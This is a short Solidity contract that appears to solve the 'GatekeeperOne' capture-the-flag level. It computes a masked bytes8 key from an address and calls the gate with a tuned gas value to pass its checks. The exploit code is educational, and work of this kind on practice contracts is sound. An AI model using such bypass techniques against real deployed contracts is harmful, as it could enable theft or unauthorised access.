// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './utils/SafeMath.sol';
import './GatekeeperOne.sol';
import "hardhat/console.sol";

contract GatekeeperOneSolution {
  GatekeeperOne public gateKeeper;

  constructor(address _gateOne) public {
    gateKeeper = GatekeeperOne(_gateOne);
  }

  function enter(address _address) external {
    bytes8 addressAsBytes8 = bytes8(uint64(uint160(_address)));
    addressAsBytes8 = addressAsBytes8 & 0x000000FF0000FFFF;
    gateKeeper.enter{gas: 82164}(addressAsBytes8);
  }
}